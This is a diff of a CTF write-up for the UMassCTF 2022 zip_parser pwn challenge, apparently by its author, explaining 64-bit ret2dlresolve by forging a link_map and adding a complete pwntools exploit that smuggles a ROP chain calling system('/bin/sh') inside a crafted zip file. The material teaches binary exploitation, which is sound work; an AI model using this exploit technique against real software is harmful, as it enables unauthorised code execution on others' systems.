@@ -8,15 +8,18 @@ by garywei944 on 4/4/2022
 world scenario of a zip parser that contains a buffer overflow vulnerability
 due to lack of boundary check. What makes the challenge extremely hard and
 non-trivial is that the binary doesn't have any output function loaded on the
-GOT table, which makes it impossible to leak any memory before exploitation.
+GOT, which makes it impossible to leak any memory before exploitation.
 
-Also, yet the pwntools automation functions for doing ret2dlresolve works well
-for this challenge, it doesn't work for 64-bit binaries with large gap between
-text and writable sections. I used an approach of manually forging link_map
-that deals with such issue.
+Also, yet the pwntools automation functions for ret2dlresolve works well for
+this challenge, it doesn't work for some 64-bit binaries with large gap between
+text and writable sections. I used an approach of manually forging link_map to
+deal with such issue.
 
 In this writeup, I will go through the thought process from developing this
-challenge and including a detailed explanation to my approach of ret2dlresolve.
+challenge, and including a detailed explanation to my approach of ret2dlresolve
+and multiple counterpart approaches.
+
+[TOC]
 
 ## Static Analysis
 
@@ -87,7 +90,7 @@ overflow and executing our ROP exploitation.
 ## Exploitation
 
 The most intuitive method to spawn a shell by a ROP exploitation is ret2libc.
-But take a look at GOT table via `readelf -r chal`
+But take a look at GOT via `readelf -r chal`
 
 ```text
 Relocation section '.rela.dyn' at offset 0x618 contains 5 entries:
@@ -133,19 +136,18 @@ challenge. *(Bear with me the most useful one is in Chinese)*
 - [ret2dlresolve利用方法](https://blog.csdn.net/qq_38204481/article/details/90074190)
   \- explanation of ret2dlresolve with diagrams, but in Chinese and on x86
 
-#### ret2dlresolve in general
+#### `__dl_runtime_resolve` in short
 
 In short, for a binary with Partial RELRO, when a function is about to be
 called for the first time, the dynamic linker need to load its address from the
-library. `__dl_runtime_resolve(link_map, rel_offset)`, the resolver is called
-to do the job.
+library. `__dl_runtime_resolve(link_map, rel_offset)` is called to do the job.
 
 To do so, the running program
 
-1. jumpy to `func@.plt` and then (using index 1 for example)
+1. jumpy to `func@.plt` (using index 1 for example)
     1. `0x401044` pushes the index 1 onto the stack, which is the index of such
        function on GOT, used as `rel_offset` later
-2. jump to `.plt` and then
+2. jump to `.plt`
     1. `0x401020` pushes `0x404008 <_GLOBAL_OFFSET_TABLE_+0x8>` onto the stack,
        which is a pointer points to the ture `link_map` in `ld.so`.
     2. `0x401026` jump to `*0x404010 <_GLOBAL_OFFSET_TABLE_+0x10>`, which is a
@@ -174,48 +176,42 @@ Disassembly of section .plt:
 
 3. inside `__dl_runtime_resolve()`,
     1. pop the address of `link_map` and `rel_offset` from the stack
-    2. locate `.rel.plt` by data in the `link_map`
-    3. locate `.symtab` by data in `.rel.plt`
-    4. locate `.strtab` by data in `symtab` and load its name, e.g. "system"
-    5. load the address of such function from the library by the data loaded in
-       previous steps.
+    2. locate `.rel.plt` using `link_map` and `rel_offset`
+    3. locate `.symtab` using data in `.rel.plt`
+    4. locate `.strtab` using data in `symtab` and load its name, e.g. "system"
+    5. load the address of such function from the library
 4. call the function with arguments in registers
 
-However, if we push a fake `rel_offset` on stack first then directly return
-to `.plt`, the resolver would use it to locate a fake `.rel.plt`,
-fake `.symtab`, fake `.strtab`, and eventually load our desired function from
-the library instead of the supposed one.
+#### ret2dlresolve in general
+
+However, if we push a corrupt `rel_offset` on stack first then directly return
+to `.plt`, the resolver would use it to locate the fake `.rel.plt`,
+fake `.symtab`, fake `.strtab` in order, and eventually load our desired
+function from the library instead of the supposed one.
 
 Therefore, to conduct a ret2dlresolve, we only need to
 
 1. make up fake `.rel.plt`, `.symtab`, and `.strtab` tables carefully
 2. write the fake tables to a writable area on stack, noted as `forged_area`
 3. calculate `rel_offset = (forged_area - JMPREL) // <size of the struct>`, now
-   the resolver will find our fake `.rel.plt` table instead of the real one.
+   the resolver would find our fake `.rel.plt` table instead of the real one
+   due to lack of boundary check.
 4. make `rel_offset` the next value on stack
 5. return to `.plt`, then the resolver should resolver our desired function and
    call it
 
-#### ret2dlresolve on 64-bit machine
-
-After reading the source code of
+This approach usually works well on 32-bit binary. After reading the source
+code of
 pwntools [Ret2dlresolvePayload](https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/rop/ret2dlresolve.py#L215-L369)
 and [rop.ret2dlresolve](https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/rop/rop.py#L1501-L1513)
 , I realized that this is also the general approach to conduct ret2dlresolve on
-64-bit machine. But a few more
-
-However, it doesn't work well sometimes.
+64-bit machine. But it doesn't always work out.
 
 #### Problems on 64-bit machine with large page
 
-The general approach has problems for 64-bit binary with large gap between text
-and writable sections. Mostly we write fake structures in BSS section of the
-binary, then we calculate `rel_offset = forged_area - JMPREL` resulting in a
-very large
-`rel_offset` and eventually guarantees a segmentation fault.
-
-`_dl_fixup()` also plays a role here which is not an issue on 32-bit machines.
-It is explained in detail
+The above approach has problems for 64-bit binary with large gap between text
+and writable sections. `_dl_fixup`  plays a role here which is not an issue on
+32-bit machines. It is explained in detail
 in [redpwnCTF 2021 - devnull-as-a-service (pwn)](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-devnull) '
 s write up.
 
@@ -257,15 +253,634 @@ this challenge, gives his surprisingly nice and
 concise [exploitation script](https://github.com/UMassCybersecurity/UMassCTF-2022-challenges/blob/main/pwn/zip_parser/solver/exploit.py)
 by this method.
 
-#### Another ret2dlresolve approach, corrupt
+### Another approach to ret2dlresolve - corrupt `.dynamic`
 
-It makes a lot of confusion to me at first
-because [redpwnCTF 2021 - devnull-as-a-service (pwn)](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-devnull)
-has a variable named `link_map` in the exploitation. But it turns out that he
+This approach is described
+in [redpwnCTF 2021 - devnull-as-a-service (pwn)](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-devnull)
+. It makes a lot of confusion to me at first because he has a variable
+named `link_map` in the exploitation. However, it turns out that he didn't
+manually make a `link_map`, but to corrupt the address of DT_STRTAB and only
+make a fake `.strtab` table with the string `system`.
+
+This approach seems much easier than the previous one, but the only problem is
+that it seems the `.dynamic` section is not writable in most of the cases. I'm
+not sure how he successfully make the exploitation work.
+
+### Yet another approach to ret2dlresolve - manually forge `link_map`
+
+This idea is given
+by [ret2dlresolve超详细教程(x86&x64)](https://blog.csdn.net/qq_51868336/article/details/114644569)
+, and I didn't find an English resource related to it.
+
+The big idea comes from the implementation of `_dl_fixup()`, we have to dive
+into the source code of it. I simplified the source code and add some comments
+for better understanding.
+
+```cpp
+// https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html
+
+_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg) {
+  // Load address of DT_SYMTAB from link_map, DT_SYMTAB = 6
+  const ElfW(Sym) *const symtab = (const void *)D_PTR(l, l_info[DT_SYMTAB]);
+  // Load address of DT_SYMTAB from link_map, DT_STRTAB = 5
+  const char *strtab = (const void *)D_PTR(l, l_info[DT_STRTAB]);
+  // Load the coresponding struct from .rela.plt, DT_JMPREL = 23
+  const PLTREL *const reloc =
+      (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
+  // Load the coresponding struct from .symtab
+  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM)(reloc->r_info)];
+  const ElfW(Sym) *refsym = sym;
+
+  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
+  lookup_t result;
+  DL_FIXUP_VALUE_TYPE value;
+
+  /* Sanity check that we're really looking at a PLT relocation.  */
+  // Check if the least bit of r_info is 7
+  assert(ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
+  /* Look up the target symbol.  If the normal lookup rules are not
+     used don't look in the global scope.  */
+  // Check if sym->st_other == 0, normally it should be
+  if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0) {
+    const struct r_found_version *version = NULL;
+
+    // Check if DT_VERSYM in link_map is NULL, normally it's not
+    if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL) {
+      /* ***********************************************************************
+        Segmentation fault: this is where ret2dlresolve doesn't work on 64-bit
+        machine with large page.
+
+        When executing vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff to compute
+        the version number, the big gap between BSS and SYMTAB makes
+        reloc->r_info too large and finally lead to a segmentation fault.
+
+        To work around it, the first choice is to make the DT_VERSYM in link_map
+        to be NULL. To do so, we need to leak the address of link_map, which
+        then we makes ret2dlresolve dumb.
+
+        The second choice is to make the outter if failed, so we need to set
+        sym->st_other (the 6th byte of the struct) not equals to 0, and jump to
+        the next else.
+      *********************************************************************** */
+      const ElfW(Half) *vernum =
+          (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
+      ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
+      version = &l->l_versions[ndx];
+      if (version->hash == 0) version = NULL;
+    }
+    /* We need to keep the scope around so do some locking.  This is
+       not necessary for objects which cannot be unloaded or when
+       we are not using any threads (yet).  */
+    int flags = DL_LOOKUP_ADD_DEPENDENCY;
+    if (!RTLD_SINGLE_THREAD_P) {
+      THREAD_GSCOPE_SET_FLAG();
+      flags |= DL_LOOKUP_GSCOPE_LOCK;
+    }
+
+    // The program won't crash in 32-bit machine and result is the successfully
+    // loaded base address of libc.
+    result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
+                                 version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+    /* We are done with the global scope.  */
+    if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG();
+    /* Currently result contains the base load address (or link map)
+       of the object that defines sym.  Now add in the symbol
+       offset.  */
+    // Similarly, on 32-bit machine, the function address is computed by
+    // value = result + st_value
+    value = DL_FIXUP_MAKE_VALUE(result, SYMBOL_ADDRESS(result, sym, false));
+  } else {
+    /* *************************************************************************
+      This is the key point for my approach, if we make the if statement above
+      failed, the function address is computed by
+
+      value = l->l_addr + st_value
+
+      Theoretically, we can contol these 2 parameter in .symtab and link_map and
+      resolve to the function that we need by set
+
+      l_addr = addr_system - addr_xxxx
+
+      and
+
+      value = addr_system - addr_xxxx + real_xxxx = real_system
+    ************************************************************************* */
+    /* We already found the symbol.  The module (and therefore its load
+       address) is also known.  */
+    value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, true));
+    result = l;
+  }
+  /* And now perhaps the relocation addend.  */
+  value = elf_machine_plt_value(l, reloc, value);
+  if (sym != NULL &&
+      __builtin_expect(ELFW(ST_TYPE)(sym->st_info) == STT_GNU_IFUNC, 0))
+    value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR(value));
+  /* Finally, fix up the plt itself.  */
+  if (__glibc_unlikely(GLRO(dl_bind_not))) return value;
+
+  // FInally, write value into GOT
+  return elf_machine_fixup_plt(l, result, refsym, sym, reloc, rel_addr, value);
+}
+```
+
+So our next goal is to forge `link_map->l_addr` and `sym->st_value` to be
+
+- `link_map->l_addr = addr_system - addr_xxxx`
+- `sym->st_value = real_xxxx`
+
+and set the 6th byte of sym not equals to zero. To do so, we need to refer to
+the struct used in `.symtab`.
+
+```cpp
+typedef struct {
+  Elf64_Word st_name;     // 4 bytes /* Symbol name (string tbl index) */
+  unsigned char st_info;  // 1 byte  /* Symbol type and binding */
+  unsigned char st_other; // 1 byte  /* Symbol visibility */
+  Elf64_Section st_shndx; // 2 bytes /* Section index */
+  Elf64_Addr st_value;    // 8 bytes /* Symbol value */
+  Elf64_Xword st_size;    // 8 bytes /* Symbol size */
+} Elf64_Sym;
+```
+
+If we can make the DT_SYMTAB pointer in `link_map` points to `xxxx@got - 0x8`,
+we have `st_value = real_xxxx`, and with great chane `st_other != 0`.
+
+With all theory set up, we are ready to forge the `link_map` and other tables.
+
+#### Forge `link_map`
+
+Recall the struct of `link_map`
+
+```text
+struct link_map {
+  /* Difference between the address in the ELF
+   file and the addresses in memory.  */
+  Elf64_Addr l_addr;  // 8 bytes
+
+  char *l_name;     // 8 bytes /* Absolute file name object was found in.  */
+  Elf64_Dyn *l_ld;  // 8 bytes /* Dynamic section of the shared object.  */
+  struct link_map *l_next;  // 8 bytes /* Chain of loaded objects.  */
+  struct link_map *l_prev;  // 8 bytes /* Chain of loaded objects.  */
+
+  /* All following members are internal to the dynamic linker.
+     They may change without notice.  */
+  /* This is an element which is only ever different from a pointer to
+     the very same copy of this type for ld.so when it is used in more
+     than one namespace.  */
+  struct link_map *l_real;  // 8 bytes
+  /* Number of the namespace this link map belongs to.  */
+  Lmid_t l_ns;                     // 8 bytes
+  /* Indexed pointers to dynamic section. */
+  struct libname_list *l_libname;  // 8 bytes
+  // l_info contains all the sym tables, 77 * 8 bytes
+  // l_info[5] is ptr to DT_STRTAB
+  // l_info[6] is ptr to DT_SYMTAB
+  // l_info[23] is ptr to DT_JMPREL
+  Elf64_Dyn *l_info[77];
+  ... size_t l_tls_firstbyte_offset;
+  ptrdiff_t l_tls_offset;
+  size_t l_tls_modid;
+  size_t l_tls_dtor_count;
+  Elf64_Addr l_relro_addr;
+  size_t l_relro_size;
+  unsigned long long l_serial;
+  struct auditstate l_audit[];
+}
+```
+
+Here we only cares about
+
+- `l_addr` at offset 0x0
+- `l_info[5]` at offset 0x68 that points to `.strtab`
+- `l_info[6]` at offset 0x70 that points to `.symtab`
+- `l_info[23]` at offset 0xf8 that points to `.rel.plt`
+
+```python
+BITMAP_64 = (1 << 64) - 1
+
+# link_map
+link_map = flat({
+    0x0: l_addr & BITMAP_64,  # l_addr
+    0x68: some_addr,  # l_info[5], ptr to DT_STRTAB in _DYNAMIC
+    # we won't use it so any writable area
+    0x70: some_addr,  # l_info[6], ptr to DT_SYMTAB in _DYNAMIC
+    0xf8: some_addr,  # l_info[23], ptr to DT_JMPREL in _DYNAMIC
+})
+```
+
+#### Forge DT_JMPREL, DT_SYMTAB, and DT_STRTAB
+
+Tracking the `link_map` on gdb
+
+![](images/link_map_rel_plt.png)
+
+1. GOT[2], ptr to `link_map`
+2. the `link_map`
+3. `l_info[23]` in `link_map`, ptr to DT_JMPREL in _DYNAMIC
+4. DT_JMPREL in _DYNAMIC, ptr to DT_JMPREL, in structure (d_tag, d_val)
+5. DT_JMPREL, the `.rel.plt` table, we can tell `0x404018` at the first entry
+   is the address for `strcpy@got`
+
+So we need to make a struct for fake _DYNAMIC, and a struct for fake `.rel.plt`
+
+```python
+# DT_JMPREL in _DYNAMIC
+_jmprel_dyn = flat([
+    0,  # d_tag
+    some_addr  # d_val, ptr to DT_JMPREL
+])
+
+# DT_JMPREL
+jmprel = flat([
+    # normally this points to the real GOT, now we need an area to read/write.
+    some_addr,  # rela->r_offset
+    7,  # rela->r_info, 7>>32=0, points to index 0 of .symtab
+    0  # # rela->r_addend
+]),
+```
+
+DT_SYMTAB and DT_STRTAB works almost the same, we need a struct for fake
+DT_SYMTAB in _DYNAMIC, a struct for fake `.symtab`, and a `\bin\sh\00` string.
+
+Merge the forged tables together, we end up with the following `forge_data`.
+For no good reason, I use `.bss + 0x100` to write the forge data.
+
+```python
+BITMAP_64 = (1 << 64) - 1
+
+forge_area = elf.get_section_by_name(".bss")["sh_addr"] + 0x100
+
+# offset between system and target_func
+target_func = 'atoi'
+l_addr = libc.sym['system'] - libc.sym[target_func]
+forge_data = flat({
+    # link_map
+    0x0: l_addr & BITMAP_64,  # l_addr
+    0x68: forge_area,  # l_info[5], ptr to DT_STRTAB in _DYNAMIC
+    # we won't use it so any writable area
+    0x70: forge_area + 0x38,  # l_info[6], ptr to DT_SYMTAB in _DYNAMIC
+    0xf8: forge_area + 0x8,  # l_info[23], ptr to DT_JMPREL in _DYNAMIC
+
+    # _DYNAMIC
+    # for DT_JMPREL
+    0x8: flat([
+        0,  # d_tag
+        forge_area + 0x18  # d_val, ptr to DT_JMPREL
+    ]),
+    # for DT_SYMTAB
+    0x38: flat([
+        0,  # d_tag 
+        elf.got[target_func] - 0x8  # d_val, ptr to DT_SYMTAB
+        # s.t. st_value pts to the target function in GOT
+    ]),
+
+    # DT_JMPREL
+    0x18: flat([
+        # normally this points to the real GOT, now we need an area to read/write.
+        forge_area - l_addr,  # rela->r_offset
+        7,  # rela->r_info, 7>>32=0, points to index 0 of .symtab
+        0  # # rela->r_addend
+    ]),
+
+    # DT_STRTAB
+    0x48: b'/bin/sh\00',
+})
+```
+
+### Make ROP chain
+
+The ROP chain would be relatively simple.
+
+1. read the `forge_data`   into `.bss + 0x100`
+2. call `_dl_runtime_resolve` with the parameters and put `rel_offset`
+   and `link_map` on stack
+3. align the stack if needed
+
+```python
+rop = ROP([elf])
+
+# bypass push link_map by adding 0x6 offset
+resolver = elf.get_section_by_name(".plt")["sh_addr"] + 0x6
+
+rop.read(0, forge_area, len(forge_data))  # read the link_map
+rop.raw(rop.ret)  # align stack to 0x10 to call system successfully
+rop.call(resolver, [forge_area + 0x48])  # call system("/bin/sh")
+rop.raw(forge_area)  # link_map
+rop.raw(0)  # rel_offset
+```
+
+### Construct zip file
+
+Recall the zip file structure from above. We just need to be careful enough and
+follow the file structure, we can make a zip file with our ROP chain.
+
+```python
+PH = b'A'  # place holder
+
+# Make compressed data
+comp_data = PH * 0xa8
+comp_data += rop.chain()
+
+# 1. Make local file header
+comp_size = len(comp_data)
+len_file_name = 8  # for easier alignment
+len_extra_field = 0
+len_comment = 0
+
+LFH = p32(0x04034b50)
+LFH += PH * 14
+LFH += p32(comp_size)  # Compressed size
+LFH += PH * 4
+LFH += p16(len_file_name)  # length file name
+LFH += p16(len_extra_field)  # length of extra field
+LFH += PH * len_file_name  # file name
+LFH += PH * len_extra_field  # extra field
+
+# 2. Make Central directory file header
+CDFH = p32(0x02014b50)
+CDFH += PH * 16
+CDFH += p32(0x40)  # Compressed size, HACKED
+CDFH += PH * 4
+CDFH += p16(len_file_name)  # File name length
+CDFH += p16(len_extra_field)  # Extra field length
+CDFH += p16(len_comment)  # File comment length
+CDFH += PH * 8
+CDFH += p32(0)  # Relative offset of local file header.
+CDFH += PH * len_file_name  # file name
+CDFH += PH * len_extra_field  # extra field
+CDFH += PH * len_comment  # comment
+
+# 3. Make End of central directory record (EOCD)
+cd_size = len(CDFH)
+# Offset of start of central directory, relative to start of archive
+cd_offset = len(LFH) + len(comp_data)
+
+EOCD = p32(0x06054b50)  # End of central directory record
+EOCD += PH * 6
+# Total number of central directory records
+EOCD += p16(1)
+# Size of central directory (bytes)
+EOCD += p32(cd_size)
+# Offset of start of central directory, relative to start of archive
+EOCD += p32(cd_offset)
+EOCD += PH * 2
+
+zip_file = LFH + comp_data + CDFH + EOCD
+size_t = len(zip_file)
+```
+
+The final zip file is 394 bytes.
+
+### Send payloads
+
+```python
+# Send size t
+payload = str(size_t + 1).rjust(8, '0').encode()
+io.send(payload)
+
+# Send zip file with ROP
+io.send(zip_file)
+
+# Send fake link map
+io.send(forge_data)
+
+io.interactive()
+```
+
+At last, we just send the zip file with ROP included, and the program should
+read the `forge_data` on to `forge_area`. We can verify it in gdb that the
+program return to `_dl_runtime_resolve` with the correct register and stack
+setup.
+
+![](images/gdb_before_resolve.png)
+
+1. pointer to the forge `link_map` is the first value on stack, followed by
+   the `rel_offset = 0`
+2. we can see the `l_addr` value matched
+3. `/bin/sh` is on rdx
+
+Therefore, we resolve to `system` successfully with the desired parameter.
+
+![](images/gdb_enter_system.png)
 
 ## Execution
+
+Finally, we finish our exploitation and everything is ready to go.
+
+```python
+from pwn import *
+
+PH = b'A'
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf = context.binary = ELF('./chal')
+libc = ELF('libc.so.6')
+
+local = True
+
+if local:
+    io = elf.process()
+else:
+    host = '34.139.216.197'
+    port = 7293
+    io = remote(host, port)
+
+if args.GDB:
+    gdb.attach(io, """
+        b *parse_data+522
+        c
+        n 14
+    """)
+
+###############################################################################
+# ret2dlresolve
+###############################################################################
+rop = ROP([elf])
+
+# bypass push link_map by adding 0x6 offset
+resolver = elf.get_section_by_name(".plt")["sh_addr"] + 0x6
+forge_area = elf.get_section_by_name(".bss")["sh_addr"] + 0x100
+SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
+STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
+JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
+
+log.info('-' * 50)
+log.info(f'_dl_resolve address: {hex(resolver)}')
+log.info(f'.dynsym address: {hex(SYMTAB)}')
+log.info(f'.dynstr address: {hex(STRTAB)}')
+log.info(f'.rel.plt address: {hex(JMPREL)}')
+log.info(f'writable buffer address: {hex(forge_area)}')
+
+###############################################################################
+# Make fake link_map
+###############################################################################
+BITMAP_64 = (1 << 64) - 1
+
+# offset between system and target_func
+target_func = 'atoi'
+l_addr = libc.sym['system'] - libc.sym[target_func]
+log.info('-' * 50)
+log.info('Making fake link_map')
+log.info(f'system@libc - {target_func}@libc: {hex(l_addr)}')
+
+forge_data = flat({
+    # link_map
+    0x0: l_addr & BITMAP_64,  # l_addr
+    0x68: forge_area,  # l_info[5], ptr to DT_STRTAB in _DYNAMIC
+    # we won't use it so any writable area
+    0x70: forge_area + 0x38,  # l_info[6], ptr to DT_SYMTAB in _DYNAMIC
+    0xf8: forge_area + 0x8,  # l_info[23], ptr to DT_JMPREL in _DYNAMIC
+
+    # _DYNAMIC
+    # for DT_JMPREL
+    0x8: flat([
+        0,  # d_tag
+        forge_area + 0x18  # d_val, ptr to DT_JMPREL
+    ]),
+    # for DT_SYMTAB
+    0x38: flat([
+        0,  # d_tag
+        elf.got[target_func] - 0x8  # d_val, ptr to DT_SYMTAB
+        # s.t. st_value pts to the target function in GOT
+    ]),
+
+    # DT_JMPREL
+    0x18: flat([
+        # normally this points to the real GOT, now we need an area to read/write.
+        forge_area - l_addr,  # rela->r_offset
+        7,  # rela->r_info, 7>>32=0, points to index 0 of .symtab
+        0  # # rela->r_addend
+    ]),
+
+    # DT_STRTAB
+    0x48: b'/bin/sh\00',
+})
+
+log.info(f'Finish make the link_map, etc, size: {hex(len(forge_data))}')
+
+rop.read(0, forge_area, len(forge_data))  # read the link_map
+rop.raw(rop.ret)  # align stack to 0x10 to call system successfully
+rop.call(resolver, [forge_area + 0x48])  # call system("/bin/sh")
+rop.raw(forge_area)  # link_map
+rop.raw(0)  # rel_offset
+
+###############################################################################
+# Make zip file
+###############################################################################
+
+# Make compressed data
+comp_data = PH * 0xa8
+comp_data += rop.chain()
+
+# 1. Make local file header
+comp_size = len(comp_data)
+len_file_name = 8  # for easier alignment
+len_extra_field = 0
+len_comment = 0
+
+LFH = p32(0x04034b50)
+LFH += PH * 14
+LFH += p32(comp_size)  # Compressed size
+LFH += PH * 4
+LFH += p16(len_file_name)  # length file name
+LFH += p16(len_extra_field)  # length of extra field
+LFH += PH * len_file_name  # file name
+LFH += PH * len_extra_field  # extra field
+
+# 2. Make Central directory file header
+CDFH = p32(0x02014b50)
+CDFH += PH * 16
+CDFH += p32(0x40)  # Compressed size, HACKED
+CDFH += PH * 4
+CDFH += p16(len_file_name)  # File name length
+CDFH += p16(len_extra_field)  # Extra field length
+CDFH += p16(len_comment)  # File comment length
+CDFH += PH * 8
+CDFH += p32(0)  # Relative offset of local file header.
+CDFH += PH * len_file_name  # file name
+CDFH += PH * len_extra_field  # extra field
+CDFH += PH * len_comment  # comment
+
+# 3. Make End of central directory record (EOCD)
+cd_size = len(CDFH)
+# Offset of start of central directory, relative to start of archive
+cd_offset = len(LFH) + len(comp_data)
+
+EOCD = p32(0x06054b50)  # End of central directory record
+EOCD += PH * 6
+# Total number of central directory records
+EOCD += p16(1)
+# Size of central directory (bytes)
+EOCD += p32(cd_size)
+# Offset of start of central directory, relative to start of archive
+EOCD += p32(cd_offset)
+EOCD += PH * 2
+
+zip_file = LFH + comp_data + CDFH + EOCD
+size_t = len(zip_file)
+
+log.info(f'Finished making zip file, size: {size_t} bytes')
+
+###############################################################################
+# Execution
+###############################################################################
+
+log.info('-' * 50)
+
+# Send size t
+payload = str(size_t + 1).rjust(8, '0').encode()
+io.send(payload)
+
+# Send zip file with ROP
+io.send(zip_file)
+
+# Send fake link map
+io.send(forge_data)
+
+io.interactive()
+```
+
+![](images/execution.png)
+
+## Thoughts
+
+It literally took me a whole day to research on ret2dlresolve and exploit the
+binary during the 48h competition. I didn't completely understand what was
+going on even after I captured the flag. Then it took me another entire day to
+further dive into the topic and make this writeup.
+
+I was surprised by seal0955's solution that does the ret2dlresolve exploitation
+with only 2 pwntools functions. So I decide to dive in to see if my time
+deserved. It turns out that I was working on an approach that quite different
+from what pwntools does and deals with more stiff cases.
+
+3 groups solved this challenge during the competition. One group successfully
+partially overwrite GOT and call `system@libc` without ret2dlresolve.
+
+I read through most of the 64-bit ret2dlresolve writeup from Google and didn't
+see another one use a similar strategy that has to look into the source code
+implementation of `_dl_fixup()`. So I decide to make this writeup more in
+details.
+
+## Limitation
+
+1. We have to know the libc version to calculate `l_addr`. It's the same
+   limitation to the partially overwrite GOT approach. But in theory, pwntools
+   ret2dlresolve doesn't need to know the libc version b/c it loads the
+   function up by its name.
+2. Not really some idea derived from theory. It really depends on the
+   implementation of `ld.so`. So it probably won't work for a different
+   implementation of `ld.so`.
+3. To deal with the 2nd limitation, we probably could do something with the
+   DT_VERSYM byte in `link_map` and we then need to worry about more part in
+   multiple sections, and I believe it won't be easier than my approach. It
+   also required to manually forge `link_map` anyway.
 
 ## Reference
 
 - [ZIP (file format) - Wikipedia](https://en.wikipedia.org/wiki/ZIP_(file_format))
-  \- for zip file structure
+- [ret2dlresolve超详细教程(x86&x64)](https://blog.csdn.net/qq_51868336/article/details/114644569)
+- [redpwnCTF 2021 - devnull-as-a-service (pwn)](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-devnull)
+- [0ctf babystack with return-to dl-resolve](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)
+- [ret2dlresolve利用方法](https://blog.csdn.net/qq_38204481/article/details/90074190)
